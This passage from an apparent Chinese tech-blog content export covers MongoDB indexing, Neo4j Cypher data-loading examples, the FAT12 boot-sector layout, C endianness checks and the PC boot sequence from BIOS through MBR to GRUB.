<td>对于文本索引，该参数决定了停用词及词干和词器的规则的列表。 默认为英语</td>
</tr>
<tr>
<td>language_override</td>
<td>string</td>
<td>对于文本索引，该参数指定了包含在文档中的字段名，语言覆盖默认的language，默认值为 language.</td>
</tr>
</tbody></table>
<p>示例：</p>
<p>在后台创建索引：</p>
<pre><code>db.values.ensureIndex(&#123;open: 1, close: 1&#125;, &#123;background: true&#125;)
</code></pre>
<p>通过在创建索引时加background:true 的选项，让创建工作在后台执行</p>
<h2 id="高级索引"><a href="#高级索引" class="headerlink" title="高级索引"></a>高级索引</h2><p>考虑以下文档集合（users ）:</p>
<pre><code>&#123;
   &quot;address&quot;: &#123;
      &quot;city&quot;: &quot;Los Angeles&quot;,
      &quot;state&quot;: &quot;California&quot;,
      &quot;pincode&quot;: &quot;123&quot;
   &#125;,
   &quot;tags&quot;: [
      &quot;music&quot;,
      &quot;cricket&quot;,
      &quot;blogs&quot;
   ],
   &quot;name&quot;: &quot;Tom Benzamin&quot;
&#125;
</code></pre>
<p>以上文档包含了 address 子文档和 tags 数组。</p>
<h3 id="索引数组字段"><a href="#索引数组字段" class="headerlink" title="索引数组字段"></a>索引数组字段</h3><p>假设我们基于标签来检索用户，为此我们需要对集合中的数组 tags 建立索引。</p>
<p>在数组中创建索引，需要对数组中的每个字段依次建立索引。所以在我们为数组tags 创建索引时，会为 music、cricket、blogs三个值建立单独的索引。</p>
<p>使用以下命令创建数组索引：</p>
<pre><code>&gt;db.users.ensureIndex(&#123;&quot;tags&quot;:1&#125;)
</code></pre>
<p>创建索引后，我们可以这样检索集合的 tags 字段：</p>
<pre><code>db.users.find(&#123;tags:&quot;cricket&quot;&#125;)&gt;
</code></pre>
<p>为了验证我们使用使用了索引，可以使用 explain 命令：</p>
<pre><code>&gt;db.users.find(&#123;tags:&quot;cricket&quot;&#125;).explain()
</code></pre>
<p>以上命令执行结果中会显示 “cursor” : “BtreeCursor tags_1”，则表示已经使用了索引。</p>
<h3 id="索引子文档字段"><a href="#索引子文档字段" class="headerlink" title="索引子文档字段"></a>索引子文档字段</h3><p>假设我们需要通过city、state、pincode字段来检索文档，由于这些字段是子文档的字段，所以我们需要对子文档建立索引。</p>
<p>为子文档的三个字段创建索引，命令如下：</p>
<pre><code>&gt;db.users.ensureIndex(&#123;&quot;address.city&quot;:1,&quot;address.state&quot;:1,&quot;address.pincode&quot;:1&#125;)
</code></pre>
<p>一旦创建索引，我们可以使用子文档的字段来检索数据：</p>
<pre><code>&gt;db.users.find(&#123;&quot;address.city&quot;:&quot;Los Angeles&quot;&#125;)
</code></pre>
<p>记住查询表达式必须遵循指定的索引的顺序。所以上面创建的索引将支持以下查询：</p>
<pre><code>&gt;db.users.find(&#123;&quot;address.city&quot;:&quot;Los Angeles&quot;,&quot;address.state&quot;:&quot;California&quot;&#125;) 
</code></pre>
<p>同样支持以下查询：</p>
<pre><code>&gt;db.users.find(&#123;&quot;address.city&quot;:&quot;LosAngeles&quot;,&quot;address.state&quot;:&quot;California&quot;,&quot;address.pincode&quot;:&quot;123&quot;&#125;)
</code></pre>
<h2 id="覆盖索引查询"><a href="#覆盖索引查询" class="headerlink" title="覆盖索引查询"></a>覆盖索引查询</h2><p>官方的MongoDB的文档中说明，覆盖查询是以下的查询：</p>
<ul>
<li>所有的查询字段是索引的一部分</li>
<li>所有的查询返回字段在同一个索引中</li>
</ul>
<p>由于所有出现在查询中的字段是索引的一部分， MongoDB无需在整个数据文档中检索匹配查询条件和返回使用相同索引的查询结果。</p>
<p>因为索引存在于RAM中，从索引中获取数据比通过扫描文档读取数据要快得多。</p>
<p>我们在 users 集合中创建联合索引，字段为 gender 和 user_name :</p>
<pre><code>&gt;db.users.ensureIndex(&#123;gender:1,user_name:1&#125;)
</code></pre>
<p>现在，该索引会覆盖以下查询：</p>
<pre><code>&gt;db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1,_id:0&#125;)
</code></pre>
<p>也就是说，对于上述查询，MongoDB的不会去数据库文件中查找。相反，它会从索引中提取数据，这是非常快速的数据查询。</p>
<p>由于我们的索引中不包括 _id字段，_id在查询中会默认返回，我们可以在MongoDB的查询结果集中排除它。</p>
<p>下面的实例没有排除_id，查询就不会被覆盖：</p>
<pre><code>&gt;db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1&#125;)
</code></pre>
<h2 id="索引限制"><a href="#索引限制" class="headerlink" title="索引限制"></a>索引限制</h2><p><strong>额外开销</strong></p>
<p>每个索引占据一定的存储空间，在进行插入，更新和删除操作时也需要对索引进行操作。所以，如果你很少对集合进行读取操作，建议不使用索引。</p>
<p><strong>内存(RAM)使用</strong></p>
<p>由于索引是存储在内存(RAM)中,你应该确保该索引的大小不超过内存的限制。</p>
<p>如果索引的大小大于内存的限制，MongoDB会删除一些索引，这将导致性能下降。</p>
<p><strong>查询限制</strong></p>
<p>索引不能被以下的查询使用：</p>
<ul>
<li>正则表达式及非操作符，如 $nin, $not, 等。</li>
<li>算术运算符，如 $mod, 等。</li>
<li>$where 子句</li>
</ul>
<p>所以，检测你的语句是否使用索引是一个好的习惯，可以用explain来查看。</p>
<p><strong>索引键限制</strong></p>
<p>从2.6版本开始，如果现有的索引字段的值超过索引键的限制，MongoDB中不会创建索引。</p>
<p><strong>插入文档超过索引键限制</strong></p>
<p>如果文档的索引字段值超过了索引键的限制，MongoDB不会将任何文档转换成索引的集合。与mongorestore和mongoimport工具类似。</p>
<p><strong>最大范围</strong></p>
<ul>
<li>集合中索引不能超过64个</li>
<li>索引名的长度不能超过125个字符</li>
<li>一个复合索引最多可以有31个字段</li>
</ul>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>neo4j创建行业与股票关系</title>
    <url>/blog/nosql/neo4j/neo4jindustrystock/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>market</th>
<th>code</th>
<th>name</th>
<th>industry</th>
<th>industry_code</th>
</tr>
</thead>
<tbody><tr>
<td>sh</td>
<td>601398</td>
<td>工商银行</td>
<td>银行</td>
<td>C070101</td>
</tr>
<tr>
<td>sh</td>
<td>600519</td>
<td>贵州茅台</td>
<td>饮料</td>
<td>C050302</td>
</tr>
<tr>
<td>sh</td>
<td>601939</td>
<td>建设银行</td>
<td>银行</td>
<td>C070101</td>
</tr>
<tr>
<td>sh</td>
<td>601318</td>
<td>中国平安</td>
<td>保险</td>
<td>C070202</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM &quot;file:///industrystock.csv&quot; AS row</span><br><span class="line">CREATE (n:STOCK)</span><br><span class="line">SET n = row</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (s:STOCK),(i3:INDUSTRYL3) where s.industry_code=i3.code create (s)-[:in]-&gt;(i3)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>nosql</category>
      </categories>
      <tags>
        <tag>nosql neo4j</tag>
      </tags>
  </entry>
  <entry>
    <title>neo4j创建时间线</title>
    <url>/blog/nosql/neo4j/neo4jtimeline/</url>
    <content><![CDATA[<h2 id="创建年"><a href="#创建年" class="headerlink" title="创建年"></a>创建年</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM &quot;file:///year.csv&quot; AS row</span><br><span class="line">CREATE (n:Year)</span><br><span class="line">SET n = row,</span><br><span class="line">n.name = row.year,</span><br><span class="line">n.year = toInteger(row.year)</span><br></pre></td></tr></table></figure>

<p>创建关系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">match (y:Year),(y2:Year) where y.year=y2.year-1 create(y)-[:next]-&gt;(y2)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>nosql</category>
      </categories>
      <tags>
        <tag>nosql neo4j</tag>
      </tags>
  </entry>
  <entry>
    <title>FAT12文件系统之引导扇区结构</title>
    <url>/blog/os/mkos/fat12bootsec/</url>
    <content><![CDATA[<p>文件系统即文件管理系统，是操作系统的重要组成部分之一，如果需要开发底层磁盘驱动或编写自己的操作系统，就必须详细了解文件系统。</p>
<p>FAT12是Microsoft公司DOS操作系统所支持的文件系统之一，此外还有FAT16和FAT32，之后会分别详述这些文件系统。当软盘被标准格式化后，磁盘被格式化为：每磁头80个柱面(磁道)，每个柱面有18个扇区，每个扇区有512字节空间。所以标准软盘的总空间(容量)为：</p>
<p>2<em>80</em>18*512&#x3D;1474560B&#x3D;1440K&#x3D;1.44M</p>
<p>FAT12文件系统将按照下表所示的方式划分全部的容量，即文件系统数据结构：</p>
<p><strong>FAT12 2880扇区 (1474560B)</strong></p>
<table>
<thead>
<tr>
<th>逻辑扇区</th>
<th>占用扇区</th>
<th>内容</th>
<th>磁盘CHS参数(磁头&#x2F;柱面&#x2F;扇区)</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1(512B)</td>
<td>引导程序</td>
<td>起：0&#x2F;0&#x2F;1</td>
</tr>
<tr>
<td>1</td>
<td>9(4608B)</td>
<td>FAT文件分配表1</td>
<td>起：0&#x2F;0&#x2F;2止：0&#x2F;0&#x2F;10</td>
</tr>
<tr>
<td>10</td>
<td>9(4608B)</td>
<td>FAT文件分配表2</td>
<td>起：0&#x2F;0&#x2F;11止：1&#x2F;0&#x2F;1</td>
</tr>
<tr>
<td>19</td>
<td>14(9728B)</td>
<td>根目录</td>
<td>-</td>
</tr>
<tr>
<td>33</td>
<td>14(9728B)</td>
<td>文件数据区</td>
<td>-</td>
</tr>
</tbody></table>
<p>操作系统之所以认识FAT12格式的磁盘，其秘密就在于逻辑0扇区这512B上。如果这512字节的最后两个字节的内容分别是55和AA（0xAA55低字节在前，高字节在后)的话，BIOS在启动时会将这个扇区读取到0:7C00h - 0:7DFFh处，然后跳转到0:7C00h处继续执行指令，操作系统即用此来达到引导系统的目的，而这个磁盘就称为可引导磁盘。操作系统标识FAT12文件系统是因为在逻辑0扇区(即引导扇区)处还存储着一个特定的数据结构，此结构有固定的格式，在操作系统将此磁盘格式化时自动生成，具体数据结构如下表所示：</p>
<table>
<thead>
<tr>
<th>标识</th>
<th>偏移量</th>
<th>类型</th>
<th>大小</th>
<th>说明</th>
<th>默认值</th>
</tr>
</thead>
<tbody><tr>
<td>?</td>
<td>0</td>
<td>db</td>
<td>3</td>
<td>跳转指令</td>
<td></td>
</tr>
<tr>
<td>BS_OEMName</td>
<td>3</td>
<td>db</td>
<td>8</td>
<td>OEM字符串，必须为8个字符，不足以空格填空</td>
<td>MSWIN4.1</td>
</tr>
<tr>
<td>BPB_BytsPerSec</td>
<td>11</td>
<td>dw</td>
<td>2</td>
<td>每扇区字节数</td>
<td>200h</td>
</tr>
<tr>
<td>BPB_SecPerClus</td>
<td>13</td>
<td>db</td>
<td>1</td>
<td>每簇占用的扇区数</td>
<td>1</td>
</tr>
<tr>
<td>BPB_RsvdSecCnt</td>
<td>14</td>
<td>dw</td>
<td>2</td>
<td>保留扇区数</td>
<td>1</td>
</tr>
<tr>
<td>BPB_NumFATs</td>
<td>16</td>
<td>db</td>
<td>1</td>
<td>FAT表的记录数</td>
<td>2</td>
</tr>
<tr>
<td>BPB_RootEntCnt</td>
<td>17</td>
<td>dw</td>
<td>2</td>
<td>最大根目录文件数</td>
<td>0e0h</td>
</tr>
<tr>
<td>BPB_TotSec16</td>
<td>19</td>
<td>dw</td>
<td>2</td>
<td>逻辑扇区总数</td>
<td>0b40h</td>
</tr>
<tr>
<td>BPB_Media</td>
<td>21</td>
<td>db</td>
<td>1</td>
<td>媒体描述符</td>
<td>0f0h</td>
</tr>
<tr>
<td>BPB_FATSz16</td>
<td>22</td>
<td>dw</td>
<td>2</td>
<td>每个FAT占用扇区数</td>
<td>9</td>
</tr>
<tr>
<td>BPB_SecPerTrk</td>
<td>24</td>
<td>dw</td>
<td>2</td>
<td>每个磁道扇区数</td>
<td>12h</td>
</tr>
<tr>
<td>BPB_NumHeads</td>
<td>26</td>
<td>dw</td>
<td>2</td>
<td>磁头数</td>
<td>2</td>
</tr>
<tr>
<td>BPB_HiddSec</td>
<td>28</td>
<td>dd</td>
<td>4</td>
<td>隐藏扇区数</td>
<td>0</td>
</tr>
<tr>
<td>BPB_TotSec32</td>
<td>32</td>
<td>dd</td>
<td>4</td>
<td>如果BPB_TotSec16是0，则在这里记录扇区总数</td>
<td>0</td>
</tr>
<tr>
<td>BS_DrvNum</td>
<td>36</td>
<td>db</td>
<td>1</td>
<td>中断13的驱动器号</td>
<td>0</td>
</tr>
<tr>
<td>BS_Reserved1</td>
<td>37</td>
<td>db</td>
<td>1</td>
<td>未使用</td>
<td>0</td>
</tr>
<tr>
<td>BS_BootSig</td>
<td>38</td>
<td>db</td>
<td>1</td>
<td>扩展引导标志</td>
<td>29h</td>
</tr>
<tr>
<td>BS_VolID</td>
<td>39</td>
<td>dd</td>
<td>4</td>
<td>卷序列号</td>
<td>0</td>
</tr>
<tr>
<td>BS_VolLab</td>
<td>43</td>
<td>db</td>
<td>11</td>
<td>卷标，必须是11个字符，不足以空格填充</td>
<td></td>
</tr>
<tr>
<td>BS_FileSysType</td>
<td>54</td>
<td>db</td>
<td>8</td>
<td>文件系统类型，必须是8个字符，不足填充空格</td>
<td>FAT12</td>
</tr>
<tr>
<td></td>
<td>62</td>
<td></td>
<td></td>
<td>引导代码，由偏移0字节处的短跳转而来</td>
<td></td>
</tr>
<tr>
<td></td>
<td>510</td>
<td>dw</td>
<td>2</td>
<td>系统引导标识</td>
<td>0aa55h</td>
</tr>
</tbody></table>
<p>首先是跳转指令，偏移0处的跳转指令必须是合法的可执行的基于x86的CPU指令，如：jmpstart，这样可以生成3字节长的指令，（加关键字short的短跳转指令的长度是2字节），指向操作系统引导代码部分。Windows和MS-DOS生成的FAT12启动扇区中的跳转指令是短跳转，如：jmpshort start，然后加一个nop的空指令来保持3字节的长度。</p>
<p>接着是位于偏移3处的OEM字符串，它必须是一个8字节长的字符串，标识了格式化此磁盘的操作系统的名称和版本号，为了保留与MS-DOS的兼容性，通常Windows2000系统格式化的磁盘上在此记录中的字符串是“MSDOS5.0”，在Windows95系统格式化的磁盘上在此记录中的字符串是“MSWIN4.0”，在Windows 95 OSR2和Windows98系统上格式化的磁盘上在此记录中的字符串是“MSWIN4.1”。</p>
<p>接下来是每扇区的字节数，类型是双字节长，标准分区上的每扇区字节数一般是512B，但也可以是其它的数字，如1024,2048和4096，FAT12的格式下设置为512(200h)。</p>
<p>偏移13处的是每簇所占用的扇区，类型是字节，簇是数据存储的最小单位，此字段的值取决于分区的大小，在FAT12格式下一般为1，即每簇只有1个扇区(512字节)，簇越大，那么分区的容量也就越大，通过增加簇的扇区数，可以支持更大的磁盘分区，标准的簇大小为1、2、4、8、16、32、64和128，FAT12格式下只能管理2^12个簇(4096)，所以在FAT12格式下能管理和分配的最大空间为：4096<em>1</em>512&#x3D;2097152B&#x3D;2M，所以FAT12一般只适合3.5寸高密度软盘(1.44M)。</p>
<p>保留扇区指的是在第一个FAT文件分配表之前的引导扇区，一般情况下只保留1个扇区(512B)。</p>
<p>接下来是类型为1字节长的FAT表的总数，默认情况下此字段的值为2，也就是有两个FAT表，FAT1和FAT2的内容相同，当FAT1表出错的时候可以使用FAT2来恢复文件分配表。</p>
<p>位于偏移17处的字段是类型为双字节长的能够储存在根目录下的最大文件(包含子目录)数量，默认为224，每个目录或文件名占用32B的空间，因此根目录的大小为：224*32&#x3D;7168B&#x3D;7KB，如果使用长文件名的话，根目录文件数还可能无法达到224的数量。</p>
<p>接下来是位于偏移19处的逻辑扇区总数，类型是双字节，如果此磁盘的逻辑扇区总数大于2^16位(65536)的话，就设置此字段为0，然后使用偏移32处的双字来表示逻辑总扇区数。</p>
<p>位于偏移21处的是单字节长的磁盘类型标识符，使用0f0h表示3.5寸高密码软盘，用0f8h来表示硬盘。此字段主要用于FAT12或FAT16的分区格式中，在Windows2000中未使用。</p>
<p>偏移22处双字节长的是每个FAT文件分配表所占用的扇区数，操作系统用这个字段和FAT表数量以及隐藏扇区数量来计算根目录所在的扇区。还可以根据最大根目录数来计算用户数据区从哪里开始。</p>
<p>根目录扇区位置&#x3D;FAT表数量*FAT表所占用的扇区数量+隐藏扇区数量</p>
<p>用户数据开始位置&#x3D;根目录扇区位置+根目录所占用扇区(FAT12格式下为224*32&#x2F;512)</p>
<p>此处所说的扇区指的是逻辑(线性)扇区，需要通过转换才能得到CHS磁盘参数，然后通过CHS参数来读写磁盘扇区。</p>
<p>接下来是位于偏移24处的每磁道扇区总数，类型是双字节长，软盘的默认值为18，即每个磁道有18个扇区。</p>
<p>然后是双字节长的磁头数，磁头数指的是磁盘面数，每面都有一个磁头，软盘都是2面的，所以在FAT12格式下此字段固定为2。</p>
<p>接下来是的位于偏移28处类型为双字(4B)长的隐藏扇区数，指的在引导扇区之前的隐藏扇区，在FAT12格式上此字段默认为0，即不隐藏任何扇区，此字段参与计算根目录区和用户数据区位置。</p>
<p>偏移32处的是类型为双字(4B)长的逻辑扇区总数，如果此分区或磁盘的逻辑扇区总数大于65536则用这个字段来表示逻辑扇区总数，否则设置此字段为0后用位于偏移19处的双字节字段来表示。</p>
<p>偏移36处的是物理驱动器号，类型是字节长，它与BIOS物理驱动器相关，在磁盘中断Int13h相关的操作中使用，第一个软盘驱动器设置为0，第一个硬盘驱动器设置为80h，第二个硬盘驱动器设置为81h，以此类推。此字段的值可以在系统引导时用dl寄存器得到。</p>
<p>位于偏移37处的字节没有使用，保留并设置为0。</p>
<p>位于偏移38处的是扩展引导标识，类型是字节，操作系统用它来识别引导信息，值可以是28h或29h。</p>
<p>接下来的是位于偏移39处的卷标号，类型是双字(4B)长，在格式化磁盘时所产生的一个随机序号，有助于区分磁盘，可以为0。</p>
<p>然后是位于偏移43处的卷标，长度必须是11字节长(不足以空格20h填充)，此字段只能使用一次，用来保存磁盘卷的标识符，再次设置的时候被保存到根目录中作为一个特殊的文件来储存。</p>
<p>最后是位于偏移54处的是长度为8字节的文件系统类型标识符，不足8字节则以空格20h来填充。FAT12格式下此字段为“FAT12”，相应的还有“FAT16”和“FAT32”。但要注意的是，操作系统并不使用这个字段来识别此磁盘所用的文件系统。</p>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>自制操作系统</category>
      </categories>
      <tags>
        <tag>自制操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>判断CPU是大端还是小端</title>
    <url>/blog/os/mkos/cpuendian/</url>
    <content><![CDATA[<p>端模式（Endian）的这个词出自Jonathan Swift书写的《格列佛游记》。这本书根据将鸡蛋敲开的方法不同将所有的人分为两类，从圆头开始将鸡蛋敲开的人被归为Big Endian，从尖头开始将鸡蛋敲开的人被归为Littile Endian。小人国的内战就源于吃鸡蛋时是究竟从大头（Big-Endian）敲开还是从小头（Little-Endian）敲开。在计算机业Big Endian和Little Endian也几乎引起一场战争。在计算机业界，Endian表示数据在存储器中的存放顺序。下文举例说明在计算机中大小端模式的区别。</p>
<p>如果将一个32位的整数0x12345678存放到一个整型变量（int）中，这个整型变量采用大端或者小端模式在内存中的存储由下表所示。为简单起见，本书使用OP0表示一个32位数据的最高字节MSB（Most Significant Byte），使用OP3表示一个32位数据最低字节LSB（Least Significant Byte）。</p>
<table>
<thead>
<tr>
<th>地址偏移</th>
<th>大端模式</th>
<th>小端模式</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>12（OP0）</td>
<td>78（OP3）</td>
</tr>
<tr>
<td>0x01</td>
<td>34（OP1）</td>
<td>56（OP2）</td>
</tr>
<tr>
<td>0x02</td>
<td>56（OP2）</td>
<td>34（OP1）</td>
</tr>
<tr>
<td>0x03</td>
<td>78（OP3）</td>
<td>12（OP0）</td>
</tr>
</tbody></table>
<p>由上表所知，采用大小模式对数据进行存放的主要区别在于在存放的字节顺序，大端方式将高位存放在低地址，小端方式将高位存放在高地址。采用大端方式进行数据存放符合人类的正常思维，而采用小端方式进行数据存放利于计算机处理。到目前为止，采用大端或者小端进行数据存放，其孰优孰劣也没有定论。</p>
<p>有的处理器系统采用了小端方式进行数据存放，如Intel的奔腾。有的处理器系统采用了大端方式进行数据存放，如IBM半导体和Freescale的PowerPC处理器。不仅对于处理器，一些外设的设计中也存在着使用大端或者小端进行数据存放的选择。</p>
<p>因此在一个处理器系统中，有可能存在大端和小端模式同时存在的现象。这一现象为系统的软硬件设计带来了不小的麻烦，这要求系统设计工程师，必须深入理解大端和小端模式的差别。大端与小端模式的差别体现在一个处理器的寄存器，指令集，系统总线等各个层次中。</p>
<p>字节数组转为整形</p>
<pre><code>/**
 * Windows 7 32位，CodeBlocks
 */
#include &lt; stdio.h&gt;
#include &lt; stdlib.h&gt;

/**
 * 将字节数组（char[]）转为整形（int）
 */
int main()
&#123;
    char chArray[] = &#123;0x78,0x56,0x34,0x12&#125;;
    int *p = (int *)chArray;
    printf(&quot;%x\n&quot;, *p);
    return 0;
&#125;
// output: 12345678
</code></pre>
<p>整形转为字节数组</p>
<pre><code>#include &lt; stdio.h&gt;
/**
 * 将整形(int)转为字节数组（char[]）
 */
int main()
&#123;
    int a = 0x12345678;
    char *p = (char *)(&amp;a);
    int i;
    for(i = 0; i &lt; 4; i++)
    &#123;
        printf(&quot;%x\n&quot;, p);
        printf(&quot;%x\n&quot;, *p);
        p++;
    &#125;
&#125;
/*
22ff44
78
22ff45
56
22ff46
34
22ff47
12
*/
</code></pre>
]]></content>
      <categories>
        <category>操作系统</category>
        <category>自制操作系统</category>
      </categories>
      <tags>
        <tag>自制操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>【转】计算机的启动过程</title>
    <url>/blog/os/mkos/computerstart/</url>
    <content><![CDATA[<h4 id="零、boot的含义"><a href="#零、boot的含义" class="headerlink" title="零、boot的含义"></a>零、boot的含义</h4><p>先问一个问题，”启动”用英语怎么说？</p>
<p>回答是boot。可是，boot原来的意思是靴子，”启动”与靴子有什么关系呢？<br>原来，这里的boot是bootstrap（鞋带）的缩写，它来自一句谚语：</p>
<pre><code>&quot;pull oneself up by one&#39;s bootstraps&quot;
</code></pre>
<p>字面意思是”拽着鞋带把自己拉起来”，这当然是不可能的事情。最早的时候，工程师们用它来比喻，计算机启动是一个很矛盾的过程：必须先运行程序，然后计算机才能启动，但是计算机不启动就无法运行程序！</p>
<p>早期真的是这样，必须想尽各种办法，把一小段程序装进内存，然后计算机才能正常运行。所以，工程师们把这个过程叫做”拉鞋带”，久而久之就简称为boot了。</p>
<p>计算机的整个启动过程分成四个阶段。</p>
<h4 id="一、第一阶段：BIOS"><a href="#一、第一阶段：BIOS" class="headerlink" title="一、第一阶段：BIOS"></a>一、第一阶段：BIOS</h4><p>上个世纪70年代初，”只读内存”（read-only<br>memory，缩写为ROM）发明，开机程序被刷入ROM芯片，计算机通电后，第一件事就是读取它。</p>
<p><img src="/images/mkos/2013-02-17-1.png" alt="BIOS" title="BIOS"></p>
<p>这块芯片里的程序叫做”基本輸出輸入系統”（Basic Input&#x2F;Output<br>System），简称为BIOS。</p>
<h5 id="1-1-硬件自检"><a href="#1-1-硬件自检" class="headerlink" title="1.1 硬件自检"></a>1.1 硬件自检</h5><p>BIOS中主要存放的程序包括：自诊断程序（通过读取CMOS<br>RAM中的内容识别硬件配置，并对其进行自检和初始化）、CMOS设置程序（引导过程中，通过特殊热键启动，进行设置后，存入CMOS<br>RAM中）、系统自动装载程序（在系统自检成功后，将磁盘相对0道0扇区上的引导程序装入内存使其运行）和主要I&#x2F;O驱动程序和中断服务（BIOS和硬件直接打交道，需要加载I&#x2F;O驱动程序）。</p>
<p>BIOS程序首先检查，计算机硬件能否满足运行的基本条件，这叫做”硬件自检”（Power-On<br>Self-Test），缩写为POST。</p>
<p>如果硬件出现问题，主板会发出不同含义的蜂鸣，启动中止。如果没有问题，屏幕就会显示出CPU、内存、硬盘等信息。</p>
<h5 id="1-2-启动顺序"><a href="#1-2-启动顺序" class="headerlink" title="1.2 启动顺序"></a>1.2 启动顺序</h5><p>硬件自检完成后，BIOS把控制权转交给下一阶段的启动程序。</p>
<p>这时，BIOS需要知道，”下一阶段的启动程序”具体存放在哪一个设备。也就是说，BIOS需要有一个外部储存设备的排序，排在前面的设备就是优先转交控制权的设备。这种排序叫做”启动顺序”（Boot<br>Sequence）。</p>
<p>打开BIOS的操作界面，里面有一项就是”设定启动顺序”。</p>
<p><img src="/images/mkos/2013-02-17-2.png" alt="BIOS Sequence" title="BIOS Sequence"></p>
<h4 id="二、第二阶段：主引导记录"><a href="#二、第二阶段：主引导记录" class="headerlink" title="二、第二阶段：主引导记录"></a>二、第二阶段：主引导记录</h4><p>BIOS按照”启动顺序”，把控制权转交给排在第一位的储存设备。即根据用户指定的引导顺序从软盘、硬盘或是可移动设备中读取启动设备的MBR，并放入指定的位置（0x7c000）内存中。</p>
<p>这时，计算机读取该设备的第一个扇区，也就是读取最前面的512个字节。如果这512个字节的最后两个字节是0x55和0xAA，表明这个设备可以用于启动；如果不是，表明设备不能用于启动，控制权于是被转交给”启动顺序”中的下一个设备。</p>
<p>这最前面的512个字节，就叫做”主引导记录”（Master boot<br>record，缩写为MBR）。</p>
<h5 id="2-1-主引导记录的结构"><a href="#2-1-主引导记录的结构" class="headerlink" title="2.1 主引导记录的结构"></a>2.1 主引导记录的结构</h5><p>“主引导记录”只有512个字节，放不了太多东西。它的主要作用是，告诉计算机到硬盘的哪一个位置去找操作系统。</p>
<p>主引导记录由三个部分组成：</p>
<pre><code>（1） 第1-446字节：调用操作系统的机器码。
（2） 第447-510字节：分区表（Partition table）。
（3） 第511-512字节：主引导记录签名（0x55和0xAA）。
</code></pre>
<p>其中，第二部分”分区表”的作用，是将硬盘分成若干个区。</p>
<h5 id="2-2-分区表"><a href="#2-2-分区表" class="headerlink" title="2.2 分区表"></a>2.2 分区表</h5><p>硬盘分区有很多好处。考虑到每个区可以安装不同的操作系统，”主引导记录”因此必须知道将控制权转交给哪个区。</p>
<p>分区表的长度只有64个字节，里面又分成四项，每项16个字节。所以，一个硬盘最多只能分四个一级分区，又叫做”主分区”。</p>
<p>每个主分区的16个字节，由6个部分组成：</p>
<pre><code>（1） 第1个字节：如果为0x80，就表示该主分区是激活分区，控制权要转交给这个分区。四个主分区里面只能有一个是激活的。
（2） 第2-4个字节：主分区第一个扇区的物理位置（柱面、磁头、扇区号等等）。
（3） 第5个字节：主分区类型。
（4） 第6-8个字节：主分区最后一个扇区的物理位置。
（5） 第9-12字节：该主分区第一个扇区的逻辑地址。
（6） 第13-16字节：主分区的扇区总数。
</code></pre>
<p>最后的四个字节（”主分区的扇区总数”），决定了这个主分区的长度。也就是说，一个主分区的扇区总数最多不超过2的32次方。</p>
<p>如果每个扇区为512个字节，就意味着单个分区最大不超过2TB。再考虑到扇区的逻辑地址也是32位，所以单个硬盘可利用的空间最大也不超过2TB。如果想使用更大的硬盘，只有2个方法：一是提高每个扇区的字节数，二是增加扇区总数。</p>
<h4 id="三、第三阶段：硬盘启动"><a href="#三、第三阶段：硬盘启动" class="headerlink" title="三、第三阶段：硬盘启动"></a>三、第三阶段：硬盘启动</h4><p>这时，计算机的控制权就要转交给硬盘的某个分区了，这里又分成三种情况。</p>
<h5 id="3-1-情况A：卷引导记录"><a href="#3-1-情况A：卷引导记录" class="headerlink" title="3.1 情况A：卷引导记录"></a>3.1 情况A：卷引导记录</h5><p>上一节提到，四个主分区里面，只有一个是激活的。计算机会读取激活分区的第一个扇区，叫做”卷引导记录”（Volume<br>boot record，缩写为VBR）。</p>
<p>“卷引导记录”的主要作用是，告诉计算机，操作系统在这个分区里的位置。然后，计算机就会加载操作系统了。</p>
<h5 id="3-2-情况B：扩展分区和逻辑分区"><a href="#3-2-情况B：扩展分区和逻辑分区" class="headerlink" title="3.2 情况B：扩展分区和逻辑分区"></a>3.2 情况B：扩展分区和逻辑分区</h5><p>随着硬盘越来越大，四个主分区已经不够了，需要更多的分区。但是，分区表只有四项，因此规定有且仅有一个区可以被定义成”扩展分区”（Extended<br>partition）。</p>
<p>所谓”扩展分区”，就是指这个区里面又分成多个区。这种分区里面的分区，就叫做”逻辑分区”（logical<br>partition）。</p>
<p>计算机先读取扩展分区的第一个扇区，叫做”扩展引导记录”（Extended boot<br>record，缩写为EBR）。它里面也包含一张64字节的分区表，但是最多只有两项（也就是两个逻辑分区）。</p>
<p>计算机接着读取第二个逻辑分区的第一个扇区，再从里面的分区表中找到第三个逻辑分区的位置，以此类推，直到某个逻辑分区的分区表只包含它自身为止（即只有一个分区项）。因此，扩展分区可以包含无数个逻辑分区。</p>
<p>但是，似乎很少通过这种方式启动操作系统。如果操作系统确实安装在扩展分区，一般采用下一种方式启动。</p>
<h5 id="3-3-情况C：启动管理器"><a href="#3-3-情况C：启动管理器" class="headerlink" title="3.3 情况C：启动管理器"></a>3.3 情况C：启动管理器</h5><p>在这种情况下，计算机读取”主引导记录”前面446字节的机器码之后，不再把控制权转交给某一个分区，而是运行事先安装的”启动管理器”（boot<br>loader），由用户选择启动哪一个操作系统。</p>
<p>Linux环境中，目前最流行的启动管理器是Grub。</p>
<p><img src="/images/mkos/2013-02-17-3.png" alt="Grub" title="Grub"></p>
<p>对于grub而言，在MBR中的446字节的引导程序属于GRUB的开始执行程序，通过这段程序，进一步执行stage1.5或是stage2的执行程序，将在下面详细介绍执行过程。</p>
